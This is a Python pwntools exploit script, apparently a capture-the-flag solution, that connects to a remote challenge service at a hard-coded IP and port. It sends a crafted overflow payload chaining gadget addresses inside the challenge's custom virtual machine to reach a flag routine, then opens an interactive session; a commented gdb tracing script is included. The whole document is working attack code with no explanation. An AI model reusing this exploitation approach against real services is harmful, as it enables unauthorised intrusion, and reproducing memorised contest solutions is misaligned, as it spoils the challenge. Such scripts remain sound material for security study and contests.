#!/usr/bin/env python3
from pwn import *

#io = process(['./orm.dbg', 'chal.ormb'])
io = remote('110.10.147.39', 31337)
if False:
    gdb.attach(io, gdbscript='''
#b ifetch_and_issue if *(long*)($rdi + 8) == 0x80808080808081f0
#b ifetch_and_issue if *(long*)($rdi + 8) == 0x808080808080824b
set logging overwrite on
set logging redirect on
set pagination off
set logging on
b ifetch_and_issue
commands
    set $stacks = *(char**)($rdi + 0x20)
    set $stacks_data = *(void***)($stacks + 0x8)
    set $stk0 = $stacks_data + *(int*)($stacks + 0x0)
    set $stk1 = $stacks_data + *(int*)($stacks + 0x4)
    printf "pc=0x%lx reg=0x%lx stk0=0x%lx stk1=0x%lx", *(long*)($rdi + 0x8), *(long*)($rdi + 0x10), *$stk0, *$stk1 
    c
end
''')
# io = remote('110.10.147.39', 31337)
#gdb.attach(io)
if 1:
    n = 8
    pop_stk1 = 0x8080808080808668
    stq_stk1 = 0x8080808080808554
    proj_addrs = 0xa0a0a0a0a0a0b008
    flag = 0x90909090909091b0
    main = 0x8080808080808556
    #desc = struct.pack('<Q', 0x8080808080808012) * 0x10
    desc = bytes(range(100, 228 - 8 * 5)) + struct.pack('<QQQQQ', main, flag, stq_stk1, proj_addrs, pop_stk1)
    # b'\xb0\x91\x90\x90\x90\x90\x90\x90'
    io.send((b'A ' + b'N' * 7 + desc) * n + b'M ' + b' ' * 9 + b'0' + b'D' * 128)
    for _ in range(n + 2):
        io.recvuntil('-) (E)xit.')
if 0:
    for i in range(8):
        io.send(b'A ' + b'N' * 7 + b'D' * 0x80 + b'S ' + b' ' * 9 + str(i).encode())
io.interactive()

'''
0x8080808080808554: stq stk1
0x8080808080808555: ret stk1

0x8080808080808668: pop stk1
0x8080808080808669: ret stk1
'''
